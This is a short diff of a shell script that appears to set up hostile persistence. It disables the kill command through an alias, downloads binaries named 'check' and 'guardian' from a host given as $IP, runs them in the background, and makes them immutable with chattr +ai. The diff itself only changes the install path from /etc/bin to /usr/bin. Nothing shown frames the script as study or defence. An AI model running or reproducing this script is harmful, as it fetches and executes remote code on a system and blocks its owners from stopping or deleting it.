@@ -45,11 +45,11 @@ echo "--------------------------------------------------------------------------
 alias kill='echo "Sorry, the kill command is disabled."'
 echo "-----------------------------------------------------------------------------"
 echo
-cd /etc/bin && wget http://$IP/check && chmod +x check 
+cd /usr/bin && wget http://$IP/check && chmod +x check 
 ./check &
-cd /etc/bin && wget http://$IP/guardian && chmod +x guardian 
+cd /usr/bin && wget http://$IP/guardian && chmod +x guardian 
 ./guardian &
-chattr +ai /etc/bin/check && chattr +ai /etc/bin/guardian
+chattr +ai /usr/bin/check && chattr +ai /usr/bin/guardian
 echo
 echo "--------------------File successfully running in the background---------------"
 echo "-----------------------------------------------------------------------------"
